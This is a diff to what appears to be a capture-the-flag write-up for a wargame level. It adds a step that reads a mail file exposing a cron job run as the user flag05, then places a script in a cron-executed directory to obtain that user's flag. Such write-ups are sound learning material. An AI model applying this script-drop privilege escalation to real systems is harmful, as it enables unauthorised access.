@@ -53,14 +53,28 @@
 
 4. **Exploit: Inject a script to get the flag.**
 
+	When we run:
+
+	```bash
+	cat /var/mail/level05
+	```
+
+	We discover a **cron job** that runs **as `flag05`** every 2 minutes:
+
+	```
+	*/2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05
+	```
+
+	This means that **`/usr/sbin/openarenaserver` is executed with `flag05`'s privileges** regularly by cron.
+
 	Create a shell script in `/opt/openarenaserver/`:
 
 	```bash
-	echo '/bin/getflag > /home/user/level05/flag.out' > /opt/openarenaserver/getflag05.sh
+	echo '/bin/getflag > /tmp/flag05' > /opt/openarenaserver/getflag05.sh
 	chmod +x /opt/openarenaserver/getflag05.sh
 	```
 
-	Then run the vulnerable binary:
+	When `flag05` run the vulnerable binary:
 
 	```bash
 	/usr/sbin/openarenaserver
@@ -70,12 +84,12 @@
 
 	* Execute your script as `flag05`
 	* Delete the script
-	* And write the flag to `flag.out`
+	* And write the flag to `/tmp/flag05`
 
 5. **Read the flag:**
 
 	```bash
-	cat /home/user/level05/flag05
+	cat /tmp/flag05
 	```
 
 	Output:
